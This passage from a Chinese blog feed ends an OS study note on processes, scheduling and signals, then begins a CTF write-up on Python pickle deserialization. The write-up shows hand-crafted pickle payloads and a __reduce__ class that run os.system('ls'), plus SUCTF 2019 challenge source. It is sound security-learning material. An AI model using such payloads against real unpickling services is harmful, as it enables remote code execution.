上下文切换只涉及到三个寄存器（PC / SP / DX）的值修改；而对比线程的上下文切换则需要涉及模式切换（从用户态切换到内核态）、以及 16 个寄存器、PC、SP…等寄存器的刷新；</p><p>内存占用少：线程栈空间通常是 2M，Goroutine 栈空间最小 2K；</p><p>Golang 程序中可以轻松支持10w 级别的 Goroutine 运行，而线程数量达到 1k 时，内存占用就已经达到 2G。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>程序员角度，可认为进程总是处于三种状态之一：</p><ul><li><p>运行：进程要么在 CPU 上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p>停止：进程的执行被挂起（suspended），且不会被调度，直到收到 SIGCONT 信号再次运行。</p></li><li><p>终止：进程永远地停止了。</p><p>  三种原因可使得进程停止：</p><ul><li>收到一个信号，该信号的默认行为是终止进程。</li><li>从主程序返回。</li><li>调用 exit 函数。</li></ul></li></ul><p>主要功能：对系统中的所有进程实施有效的管理，包括创建新进程、撤销已有进程、实现进程状态转换。</p><p>原语：是一种特殊的程序，执行必须一气呵成，不可中断。用开、关中断实现的。</p><p>唤醒进程：</p><ul><li><p>从等待队列中移出</p></li><li><p>修改 PCB 进程状态</p></li><li><p>加入就绪队列</p></li></ul><h3 id="获取进程-ID"><a href="#获取进程-ID" class="headerlink" title="获取进程 ID"></a>获取进程 ID</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpid(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">pid_t</span> getppid(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><h3 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h3><ul><li>建立 PCB，生成 pid</li><li>初始化 PCB</li><li>加入就绪队列</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h3><p>当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收（reaped）。当父进程回收已终止的子进程时，内核将子进程的退出状态传递个父进程，然后抛弃已终止进程，从此时开始，该进程才不存在。</p><p>一个终止了但还未被回收的进程成为僵死进程（zombie）。</p><p>僵死进程已经终止了，但内核仍保留着它的某些状态直到父进程回收它为止。</p><p>一个进程可通过调用 <code>waitpid()</code> 来等待它的子进程终止或者停止。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span>* statusp, <span class="keyword">int</span> options);</span><br></pre></td></tr></table></figure><p>（TODO：深入整理）</p><h3 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h3><ul><li>修改 PCB 中的进程状态</li><li>现场保护</li><li>将进程加入合适的等待队列</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">// 休眠至进程接收到一个信号</span></span><br></pre></td></tr></table></figure><h3 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h3><p><code>execve()</code> 函数在当前进程的上下文加载并运行一个新程序。</p><p><code>fork()</code> 函数则是在新的子进程中运行相同的程序，新的子进程是父进程的一个复制品。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">const</span> <span class="keyword">char</span>** argv, <span class="keyword">const</span> <span class="keyword">char</span>** envp)</span></span>;</span><br></pre></td></tr></table></figure><p>与 fork 一次调用两次返回不同，execve 调用一次并从不返回。</p><h2 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h2><p>一旦资源不足时就需要进行调度，比如现实中的十字路口，需要红绿灯来调度。</p><p>作业与进程调度的区别：作业是内外存的调度，进程是CPU与内存间的调度</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><ul><li><p>周转时间和平均周转时间</p><p>  周转时间 = 完成时刻 - 提交作业时刻</p><p>  平均周转时间 = 总周转时间 / n</p><p>  加权平均周转算法 = </p></li><li><p>响应时间</p></li><li><p>评价调度性能的其他指标</p><ul><li>公平合理</li><li>提高资源利用率</li><li>吞吐量</li></ul></li></ul><h3 id="作业调度"><a href="#作业调度" class="headerlink" title="作业调度"></a>作业调度</h3><p>作业调度：按一定的策略从后备队列中选择一部分作业，为他们分配运行所必须的资源、创建进程的过程。</p><p>总的来说，都是一个作业执行结束后再开始调度。</p><p>提交状态：</p><p>后备状态：</p><p>执行状态：作业进入了内存</p><p>完成状态：</p><h4 id="先来先服务算法（FCFS）"><a href="#先来先服务算法（FCFS）" class="headerlink" title="先来先服务算法（FCFS）"></a>先来先服务算法（FCFS）</h4><p>对长作业有利、短作业不利</p><h4 id="短作业优先算法（SJF）"><a href="#短作业优先算法（SJF）" class="headerlink" title="短作业优先算法（SJF）"></a>短作业优先算法（SJF）</h4><p>上一作业运行结束后，在就绪作业里选择时间最短的。</p><h4 id="高响应比优先算法（HRN）"><a href="#高响应比优先算法（HRN）" class="headerlink" title="高响应比优先算法（HRN）"></a>高响应比优先算法（HRN）</h4><p>响应比 = （系统当前时间 - 作业提交时间） / 作业大小</p><p>优先选择响应比最大的作业</p><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>从进程就绪队列中选一个进程，让其占用CPU运行。</p><h4 id="时间片轮转算法（RR）"><a href="#时间片轮转算法（RR）" class="headerlink" title="时间片轮转算法（RR）"></a>时间片轮转算法（RR）</h4><p>公平地、轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应。</p><p>优点：公平、响应快，适用于分时操作系统。</p><p>缺点：由于高频率的进程切换，因此有一定开销；不区分任务的紧急程度。</p><h4 id="优先级算法（Priority）"><a href="#优先级算法（Priority）" class="headerlink" title="优先级算法（Priority）"></a>优先级算法（Priority）</h4><p>调度时选择优先级最高的作业 / 进程。</p><p>优先级分配有静态和动态两种。</p><p>对于 I/O 繁忙和 CPU 繁忙的进程，应该赋予 I/O 繁忙进程更高的优先级，有利于提高并行程度。</p><h4 id="多级反馈队列算法"><a href="#多级反馈队列算法" class="headerlink" title="多级反馈队列算法"></a>多级反馈队列算法</h4><h4 id="时限调度算法"><a href="#时限调度算法" class="headerlink" title="时限调度算法"></a>时限调度算法</h4><p>用于实时系统的调度。</p><h3 id="交换调度"><a href="#交换调度" class="headerlink" title="交换调度"></a>交换调度</h3><p>缓解内存紧张，将一部分就绪状态或阻塞状态进程调出到外存，需要的时候再调回来，即内外存交换。</p><h3 id="设备调度"><a href="#设备调度" class="headerlink" title="设备调度"></a>设备调度</h3><p>让哪个进程使用该设备。</p><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p><strong>根本原因</strong>：系统拥有的资源数量小于各进程对资源的需求总数。</p><p>死锁：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进。</p><p>​            至少有两个或两个以上的进程同时死锁，死锁进程一定处于阻塞态。</p><p>饥饿：可能只有一个进程发生饥饿。</p><p>死循环：可能只有一个进程发生死循环，死循环的进程也可能就绪。</p><p>死锁和饥饿是操作系统要解决的问题，死循环是程序员的事情。</p><p>如果系统中的所有进程存在一个可完成的执行序列P1，…，Pn，则称系统处于安全状态。</p><h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul><li>互斥：对必须互斥使用的资源的争夺才会导致死锁。</li><li>不剥夺：进程保持的资源只能主动释放，不能被强行剥夺。</li><li>请求与保持：保持着某些资源不放的同时，请求别的资源。</li><li>环路等待：存在一种进程资源的循环等待链。循环等待未必死锁。</li></ul><h4 id="处理策略"><a href="#处理策略" class="headerlink" title="处理策略"></a>处理策略</h4><p>预防：破坏死锁产生的四个必要条件</p><p>避免：避免系统进入不安全状态（银行家算法）</p><p>检测和解除：允许死锁发生，系统负责检测出死锁并解除。</p><p>忽略：鸵鸟算法</p><h2 id="系统调用错误处理"><a href="#系统调用错误处理" class="headerlink" title="系统调用错误处理"></a>系统调用错误处理</h2><p>参见 <code>error.h</code>，这里想说的还是对错误返回处理的封装。</p><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的时间。在 Linux 上支持了 30 中不同类型的信号。每个信号类型都对应于某种系统事件。</p><p>低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的。</p><p>信号提供了一种机制，通知余户进程发生了这些异常。</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>内核通过更新目的进程上下文中的某个状态，发送一个信号给目的进程。</p><p>发送信号可以有如下两种原因：</p><ul><li>内核检测到一个系统事件，比如除零错误或者子进程终止。</li><li>一个进程调用了 kill 函数，显示地要求内核发送一个信号给目的进程。</li></ul><p>一个进程可以发送信号给它自己。</p><p><strong>Unix 系统发送信号的机制</strong></p><ul><li><p>进程组</p><p>  每个进程都只属于一个进程组，进程组是由一个正整数进程组 ID 来标识的。</p><p>  默认一个子进程和它父进程同属于一个进程组。</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpgrp(<span class="keyword">void</span>);  <span class="comment">// 返回调用进程的进程组 ID</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;  <span class="comment">// 设置进程组成功返回 0，否则为 -1</span></span><br></pre></td></tr></table></figure></li><li><p>用 <code>/bin/kill</code> 程序</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -9 1023# 杀掉 1023 进程</span><br><span class="line">kill -9 -1023# 杀掉 1023 进程组的每个进程</span><br></pre></td></tr></table></figure></li><li><p>从键盘发送</p><p>  CTRL + C / Z  ：终止 / 挂起</p></li><li><p>用 kill 函数</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>用 alarm 函数发送</p><p>  进程可通过调用 alarm 函数向自己发送 SIGALRM 信号，网络编程中可拿来处理超时。</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h3><p>当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个信号处理函数的用户层函数捕获这个信号。</p><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><h2 id="非本地跳转"><a href="#非本地跳转" class="headerlink" title="非本地跳转"></a>非本地跳转</h2><h2 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h2><ul><li><p>strace</p><p>  打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。</p><p>  这是一个超级牛逼的工具，比如你想跟进 PHP 内核底层实现，这就能收获大量信息。</p></li><li><p>ps</p><p>  列出当前系统中的进程（包括僵尸进程）。</p></li><li><p>top</p><p>  打印出关于当前进程资源使用的信息。</p></li><li><p>pmap</p><p>  显示进程的内存映射。</p></li><li><p>/proc</p><p>  一个虚拟文件系统，以 ASCII 文本格式输出大量内核数据结构的内容（从这也能感受到 Linux 文件的重要性），用户程序可以读取这些内容。</p><p>  （TODO：补充详细结构及其作用）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;应用是如何与操作系统进行交互的？&lt;/p&gt;
&lt;h2 id=&quot;异常&quot;&gt;&lt;a href=&quot;#异常&quot; class=&quot;headerlink&quot; title=&quot;异常&quot;&gt;&lt;/a&gt;异常&lt;/h2&gt;&lt;p&gt;异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。&lt;/p&gt;
&lt;p&gt;在任何
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Python pickle 反序列化实例分析</title>
    <link href="https://wywwzjj.top/2019/10/24/Python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/</id>
    <published>2019-10-24T02:26:07.000Z</published>
    <updated>2020-03-22T10:11:48.075Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。</p><p>这个 PPT 一定要好好看看，非常的通俗易懂。<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><blockquote><p>Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）</p><p>用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     <span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># 这里 _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><ul><li>从对象中提取所有属性（<code>__dict__</code>），并将属性转为键值对</li><li>写入对象的类名</li><li>写入键值对</li></ul><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><ul><li>获取 pickle 输入流</li><li>重建属性列表</li><li>根据保存的类名创建一个新的对象</li><li>将属性复制到新的对象中</li></ul><h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>PVM 由三部分组成：</p><ul><li><p><strong>指令处理器</strong></p><p>  从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止。</p><p>  最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p><strong>stack</strong></p><p>  由 Python 的 <strong>list</strong> 实现，被用来临时存储数据、参数以及对象。</p></li><li><p><strong>memo</strong></p><p>  由 Python 的 <strong>dict</strong> 实现，为 PVM 的整个生命周期提供存储。</p></li></ul><p><strong>PS</strong>：注意下 stack、memo 的实现方式，方便理解下面的指令。</p><blockquote><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>。</li></ul></blockquote><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote><p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S'ls'=&gt;  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack</span><br><span class="line">t=&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R =&gt;  system(*('ls',))</span><br><span class="line">.=&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote><p>完整源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p></blockquote><p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure><p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">    ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = 